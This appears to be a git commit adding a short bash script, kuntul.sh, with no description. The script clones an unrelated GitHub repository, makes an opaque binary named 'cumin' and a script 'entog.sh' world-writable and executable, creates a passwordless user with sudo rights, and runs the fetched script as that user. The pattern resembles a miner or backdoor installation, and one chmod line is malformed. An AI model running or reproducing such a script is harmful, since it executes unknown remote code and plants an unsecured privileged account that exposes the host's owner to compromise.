104089bda7f63d7f4108cb23e50ce264726dcc85
vanessa-jua0724 <72494519+vanessa-jua0724@users.noreply.github.com>
2021-07-24 18:05:25 +0000

    Add files via upload

---
+++ kuntul.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/Jdhdidhehevej/cau.git && cd cau
+chmod +x entog.sh && chmod +x cumin chmod 777 cumin entog.sh
+sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
+sudo -u hoh -H sh -c "./entog.sh"
+sudo apt update
